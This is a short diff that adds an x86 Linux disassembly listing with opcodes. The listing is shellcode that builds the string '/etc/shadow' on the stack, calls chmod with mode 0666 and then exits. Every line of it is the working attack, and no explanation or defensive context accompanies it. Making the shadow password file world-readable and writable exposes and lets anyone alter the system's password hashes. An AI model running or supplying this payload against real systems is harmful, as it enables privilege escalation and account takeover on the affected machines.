@@ -1,0 +1,14 @@
+00000000  31DB              xor ebx,ebx
+00000002  68646F7753        push dword 0x53776f64
+00000007  682F736861        push dword 0x6168732f
+0000000C  682F657463        push dword 0x6374652f
+00000011  89E3              mov ebx,esp
+00000013  31C9              xor ecx,ecx
+00000015  884C240B          mov [esp+0xb],cl
+00000019  66B9B601          mov cx,0x1b6
+0000001D  31C0              xor eax,eax
+0000001F  B00F              mov al,0xf
+00000021  CD80              int 0x80
+00000023  31C0              xor eax,eax
+00000025  40                inc eax
+00000026  CD80              int 0x80
